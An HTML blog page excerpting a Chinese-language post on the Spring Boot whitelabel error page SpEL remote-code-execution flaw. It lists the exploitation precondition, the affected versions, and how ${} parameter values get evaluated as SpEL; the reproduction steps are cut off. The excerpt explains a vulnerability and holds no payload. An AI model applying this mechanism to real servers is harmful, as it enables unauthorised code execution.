+        <h1 id="Spring-Boot-whitelabel-error-page-SpEL-rce"><a href="#Spring-Boot-whitelabel-error-page-SpEL-rce" class="headerlink" title="Spring Boot whitelabel error page SpEL rce"></a>Spring Boot whitelabel error page SpEL rce</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>  至少知道一个触发 springboot 默认错误页面的接口及参数名</li>
+</ul>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h4 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
+<li>spring boot 处理参数值出错，流程进入<br> <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li>
+<li> 此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li>
+<li>其中 <code>$&#123;&#125;</code> 包围的内容都会被<br> <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code><br> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE<br> 漏洞</li>
+</ol>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20whitelabel%20error%20page%20SpEL%20rce/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Boot/Spring%20Boot%20whitelabel%20error%20page%20SpEL%20rce/" data-id="cl5c2qvmr00gqy8v15hte0voq" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/40/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/39/">39</a><a class="page-number" href="/page/40/">40</a><span class="page-number current">41</span><a class="page-number" href="/page/42/">42</a><a class="page-number" href="/page/43/">43</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/42/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
